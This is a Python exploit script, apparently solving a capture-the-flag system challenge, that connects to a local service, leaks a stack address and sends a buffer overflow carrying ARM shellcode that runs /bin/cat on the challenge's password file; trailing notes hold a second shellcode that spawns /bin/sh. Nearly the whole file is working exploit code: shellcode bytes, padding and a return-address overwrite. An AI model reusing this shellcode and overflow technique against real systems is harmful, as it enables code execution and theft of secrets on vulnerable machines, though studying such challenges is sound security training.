import socket
import time

hote = "localhost"
port = 61045

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect((hote, port))

data = socket.recv(4096)
print(data)

data_sent = "AAAA\n"

socket.send(data_sent)

time.sleep(1)

data = socket.recv(4096)
print(data)

adr = data.split(':')[0]
adr = adr[2:]

ba = bytearray.fromhex(adr)
ba.reverse()

data_sent = "y\n"

socket.send(data_sent)

time.sleep(1)
data = socket.recv(4096)
print(data)

dump = b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x24\x33\x78\x46\x16\x30\x92\x1a\x02\x72\x05\x1c\x2c\x35\x2a\x70\x69\x46\x4b\x60\x8a\x60\x08\x60\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x63\x61\x74\x5a\x2f\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x2f\x61\x70\x70\x2d\x73\x79\x73\x74\x65\x6d\x65\x2f\x63\x68\x34\x35\x2f\x2e\x70\x61\x73\x73\x77\x64'+"A"*84 + ba + '\n'

socket.send(dump)

time.sleep(1)
data = socket.recv(4096)
print(data)


data_sent = "n\n"

socket.send(data_sent)

time.sleep(1)
data = socket.recv(4096)
print(data)

data_sent = "ls -al\n"

socket.send(data_sent)

time.sleep(1)
data = socket.recv(4096)
print(data)



2f 62 69 6e 2f 63 61 74




# execve(/bin/cat, /challenge/app-systeme/ch45/.passwd, NULL)

"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0a\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"

           "\x01\x30\x8f\xe2"
           "\x13\xff\x2f\xe1"
           "\x78\x46\x0a\x30"
           "\x01\x90\x01\xa9"
           "\x92\x1a\x0b\x27"
           "\x01\xdf\x2f\x2f"
           "\x62\x69\x6e\x2f"
           "\x73\x68"